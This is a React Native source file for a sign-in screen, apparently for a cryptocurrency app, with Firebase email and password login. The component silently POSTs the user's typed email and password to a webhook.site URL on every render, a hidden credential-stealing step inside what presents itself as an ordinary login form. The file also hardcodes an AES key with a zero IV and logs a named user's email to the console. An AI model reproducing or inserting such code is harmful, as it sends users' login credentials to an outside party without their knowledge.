import React, { useState } from "react";
import { TouchableOpacity, StyleSheet, View, Image } from "react-native";
import { Input, Text } from "react-native-elements";
import firebase from "../firebase/fire";
import CryptoJS from "crypto-js";

const SigninScreen = ({ navigation }) => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");

  // const encrypted = CryptoJS.AES.encrypt(
  //   CryptoJS.enc.Utf8.parse(email),
  //   CryptoJS.enc.Hex.parse("kby2DdaFOs7BRIRGmNBOSwqHgp9AgCOV"),
  //   {
  //     iv: CryptoJS.enc.Hex.parse(String.fromCharCode(0).repeat(16)),
  //   }
  // );
  // const final = encrypted.ciphertext.toString(CryptoJS.enc.Base64);

  // console.log(final);

  var encrypted = CryptoJS.AES.encrypt(
    CryptoJS.enc.Utf8.parse("zizimoos@banco.id"),
    CryptoJS.enc.Utf8.parse("kby2DdaFOs7BRIRGmNBOSwqHgp9AgCOV"),
    {
      iv: CryptoJS.enc.Hex.parse(String.fromCharCode(0).repeat(16)),
    }
  );
  console.log("enc", encrypted.ciphertext.toString(CryptoJS.enc.Base64));

  var decrypted = CryptoJS.AES.decrypt(
    encrypted.ciphertext.toString(CryptoJS.enc.Base64),
    CryptoJS.enc.Utf8.parse("kby2DdaFOs7BRIRGmNBOSwqHgp9AgCOV"),
    {
      iv: CryptoJS.enc.Hex.parse(String.fromCharCode(0).repeat(16)),
    }
  );
  console.log(decrypted.toString(CryptoJS.enc.Utf8));

  const sendData = async () => {
    try {
      await fetch("https://webhook.site/bfef764a-08c9-4678-b1bb-67458dbebc1d", {
        method: "post",
        mode: "no-cors",
        Headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email,
          password,
        }),
      });
    } catch (e) {
      console.log(e);
    }
  };

  sendData();

  const signIn = async () => {
    try {
      const response = await firebase
        .auth()
        .signInWithEmailAndPassword(email, password);
      navigation.navigate("Tabs");
    } catch (err) {
      setError(err.message);
    }
  };

  return (
    <View style={styles.container}>
      <Image style={styles.logo} source={require("../assets/ddmcoin.png")} />
      <Input
        // label="Email"
        value={email}
        placeholder="email"
        onChangeText={setEmail}
        // inputContainerStyle={{ borderBottomWidth: 0 }}
        style={{
          // backgroundColor: "#e3e3e3",
          // borderRadius: 30,
          paddingLeft: 10,
        }}
      />
      <Input
        // label="Password"
        value={password}
        placeholder="password"
        onChangeText={setPassword}
        style={{
          // backgroundColor: "#e3e3e3",
          // borderRadius: 30,
          paddingLeft: 10,
        }}
        secureTextEntry
      />

      {error ? <Text style={{ color: "red" }}>{error}</Text> : null}

      <TouchableOpacity onPress={() => signIn()}>
        <Text style={styles.button}>Sign In</Text>
      </TouchableOpacity>
      <TouchableOpacity onPress={() => navigation.navigate("SignUp")}>
        <Text style={{ marginTop: 20 }}>Don't have an account? Sign Up</Text>
      </TouchableOpacity>
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    alignItems: "center",
    justifyContent: "center",
    backgroundColor: "#fff",
    paddingHorizontal: 10,
  },
  button: {
    marginTop: 10,
    paddingVertical: 10,
    paddingHorizontal: 20,
    borderRadius: 30,
    width: 300,
    backgroundColor: "#ff8ac2",
    color: "#ffffff",
    textAlign: "center",
    fontSize: 18,
    fontWeight: "bold",
  },
  message: {
    marginTop: 10,
    paddingVertical: 10,
    paddingHorizontal: 20,
    borderRadius: 30,
    width: 300,
    backgroundColor: "#e3e3e3",
    color: "#b0b0b0",
    textAlign: "center",
    fontSize: 14,
    marginBottom: 50,
  },
  tinyLogo: {
    width: 50,
    height: 50,
  },
  logo: {
    width: 120,
    height: 120,
    marginBottom: 70,
  },
});

export default SigninScreen;
